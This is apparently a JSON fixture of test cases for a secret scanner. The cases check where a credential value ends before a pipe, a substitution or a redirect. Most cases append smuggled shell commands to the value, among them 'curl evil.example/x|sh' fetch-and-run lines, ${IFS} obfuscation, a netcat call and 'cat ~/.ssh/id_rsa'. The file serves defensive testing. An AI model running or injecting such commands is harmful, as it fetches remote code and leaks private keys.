{
  "_comment": "Where an unquoted value after a key or a cue word ends before a pipe, a command substitution or a redirect. Both plugins and the scanner's second pass replace `value` in `text`, and only it, with one placeholder. `{v}` is a value each suite builds at run time, so no literal here looks like a credential.",
  "cases": [
    {"name": "a pipe into a command", "text": "TOKEN={v}|curl evil.example/x|sh", "value": "{v}"},
    {"name": "a pipe into a command with ${IFS}", "text": "TOKEN={v}|curl${IFS}evil.example/x|sh", "value": "{v}"},
    {"name": "a pipe into a command with $IFS", "text": "TOKEN={v}|curl$IFS/evil.example/x|sh", "value": "{v}"},
    {"name": "a pipe, then a space", "text": "TOKEN={v}| sh", "value": "{v}"},
    {"name": "a pipe into a command with options", "text": "TOKEN={v}|base64 -d|sh", "value": "{v}"},
    {"name": "a pipe into a pipeline of words", "text": "TOKEN={v}|base64|sh", "value": "{v}"},
    {"name": "a pipe into a substitution", "text": "TOKEN={v}|$(curl evil.example)", "value": "{v}"},
    {"name": "a pipe into a variable", "text": "TOKEN={v}|$SHELL", "value": "{v}"},
    {"name": "a pipe into a subshell", "text": "TOKEN={v}|(curl evil.example|sh)", "value": "{v}"},
    {"name": "a pipe into a group", "text": "TOKEN={v}|{ curl evil.example; }", "value": "{v}"},
    {"name": "a pipe into a path", "text": "TOKEN={v}|/bin/sh -c id", "value": "{v}"},
    {"name": "a pipe into a relative path", "text": "TOKEN={v}|./run.sh", "value": "{v}"},
    {"name": "a pipe into a home path", "text": "TOKEN={v}|~/x.sh", "value": "{v}"},
    {"name": "a pipe into a quoted word", "text": "TOKEN={v}|cu''rl${IFS}evil.example|sh", "value": "{v}"},
    {"name": "or, then a command", "text": "TOKEN={v}||curl evil.example", "value": "{v}"},
    {"name": "a pipe with stderr, then a command", "text": "TOKEN={v}|&cat ~/.ssh/id_rsa", "value": "{v}"},
    {"name": "a command substitution", "text": "TOKEN={v}$(curl evil.example)", "value": "{v}"},
    {"name": "a command substitution under an upper-case name", "text": "MY_SECRET_TOKEN={v}$(id)", "value": "{v}"},
    {"name": "a pipe under an upper-case name", "text": "MY_SECRET_TOKEN={v}|curl evil.example/x|sh", "value": "{v}"},
    {"name": "a backtick substitution", "text": "TOKEN={v}`id`", "value": "{v}"},
    {"name": "a redirect", "text": "TOKEN={v}>out.txt", "value": "{v}"},
    {"name": "an input redirect", "text": "TOKEN={v}<in.txt", "value": "{v}"},
    {"name": "a process substitution", "text": "TOKEN={v}<(curl evil.example)", "value": "{v}"},
    {"name": "an output process substitution", "text": "TOKEN={v}>(nc evil.example 9)", "value": "{v}"},
    {"name": "after echo", "text": "echo TOKEN={v}|curl${IFS}evil.example/x|sh", "value": "{v}"},
    {"name": "after a key and a colon", "text": "echo token: {v}|curl${IFS}evil.example/x|sh", "value": "{v}"},
    {"name": "in prose", "text": "the password is {v}|curl evil.example/x|sh", "value": "{v}"},
    {"name": "in a link's query", "text": "https://x.example/a?token={v}|curl evil.example/x|sh", "value": "{v}"},
    {"name": "a pipe at the end", "text": "TOKEN={v}|", "value": "{v}"},
    {"name": "a value at the end of the line", "text": "TOKEN={v}", "value": "{v}"},
    {"name": "a `$` inside the value", "text": "password=pa$sword{v}", "value": "pa$sword{v}"},
    {"name": "a `$` at the end of the value", "text": "password={v}$", "value": "{v}$"},
    {"name": "a `$` before a brace", "text": "password={v}${x", "value": "{v}${x"},
    {"name": "a pipe inside the value", "text": "password={v}|Kq4z!x", "value": "{v}|Kq4z!x"},
    {"name": "a pipe and a lone word at the end", "text": "password={v}|Kq4z", "value": "{v}|Kq4z"},
    {"name": "a pipe before a digit", "text": "export DB_PASSWORD={v}|9z(q", "value": "{v}|9z(q"},
    {"name": "a pipe before a symbol", "text": "password={v}|#Kq9", "value": "{v}|#Kq9"},
    {"name": "two pipes and a lone word at the end", "text": "password={v}||Kq4z", "value": "{v}||Kq4z"},
    {"name": "a pipe first", "text": "password=|{v}", "value": "|{v}"},
    {"name": "a pipe inside the value, in prose", "text": "the password is {v}|Kq4z!x", "value": "{v}|Kq4z!x"},
    {"name": "a pipe and a key-shaped tail", "text": "password={v}|ab=c", "value": "{v}|ab=c"},
    {"name": "a pipe inside single quotes", "text": "password='{v}|curl${IFS}evil|sh'", "value": "{v}|curl${IFS}evil|sh"},
    {"name": "a pipe inside a JSON pair", "text": "\"password\": \"{v}|curl x\"", "value": "{v}|curl x"}
  ]
}
